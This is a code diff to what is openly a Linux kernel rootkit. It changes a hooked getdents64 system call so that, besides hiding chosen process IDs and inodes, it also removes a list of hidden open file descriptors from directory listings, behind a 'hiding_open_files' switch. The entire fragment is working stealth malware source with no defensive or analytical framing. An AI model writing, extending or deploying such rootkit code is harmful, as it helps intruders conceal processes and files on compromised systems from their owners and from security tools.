@@ -213,9 +213,6 @@ g7_getdents64(const struct pt_regs *pt_regs)
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
 
-    if((fd_pid = may_fd(dirfile)) != -1)
-        is_fd = 1;
-
     atomic_inc(&getdents64_count);
 
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
@@ -235,12 +232,18 @@ g7_getdents64(const struct pt_regs *pt_regs)
                 hi_tail = add_inode_to_list(hi_tail, inode);
         }
     }
+    
+    if(rootkit.hiding_open_files && ((fd_pid = may_fd(dirfile)) != -1)) {
+        is_fd = 1;
+        fill_fds(fd_pid);
+    }
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
 
         if ((may_proc && list_contains_pid(&hidden_pids, PID_FROM_NAME(cur_kdirent->d_name)))
-            || list_contains_inode(hi_head, cur_kdirent->d_ino))
+            || list_contains_inode(hi_head, cur_kdirent->d_ino)
+            || list_contains_fd(&hidden_fds, FD_FROM_NAME(cur_kdirent->d_name)))
         {
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
